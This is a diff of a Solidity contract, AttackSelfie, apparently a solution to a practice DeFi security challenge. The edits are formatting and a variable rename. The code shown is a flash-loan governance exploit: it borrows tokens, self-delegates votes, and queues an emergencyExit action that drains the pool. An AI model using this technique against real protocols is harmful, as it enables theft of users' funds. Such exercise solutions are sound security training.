@@ -34,31 +34,30 @@ contract AttackSelfie {
         uint256 amount, 
         uint256 fee,
         bytes calldata data
-    ) external returns(bytes32) {
+    ) external returns (bytes32) {
         damnValuableToken.delegate(address(this));
-        
         uint _actionId = governance.queueAction(
             address(pool),
             0,
             data
         );
+
         actionId = _actionId;
-       
         IERC20(token).approve(address(pool), amount + fee);
         return CALL_BACK_SUCCESS;
     }
 
     function attackSetup(address recovery) external returns(bool) {
-        uint amountRequired = 1500000 ether;
+        uint amount = 1500000 ether;
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
         
         pool.flashLoan(
             IERC3156FlashBorrower(address(this)),
             address(damnValuableToken),
-            amountRequired,
+            amount,
             data
         );
-        
+
         return true;
     }
 
